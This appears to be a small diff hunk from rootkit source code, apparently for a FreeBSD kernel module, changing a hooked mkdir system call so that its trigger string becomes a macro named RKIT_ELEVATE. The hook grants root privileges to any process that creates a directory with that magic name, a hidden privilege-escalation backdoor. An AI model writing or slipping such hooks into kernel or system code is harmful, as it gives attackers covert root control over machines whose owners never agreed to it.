@@ -76,7 +76,7 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 		return(error);
 	}
 
-	if (strcmp(path, "escalate") == 0)
+	if (strcmp(path, RKIT_ELEVATE) == 0)
 	{
 		privilege_set(td, 0);
 	}
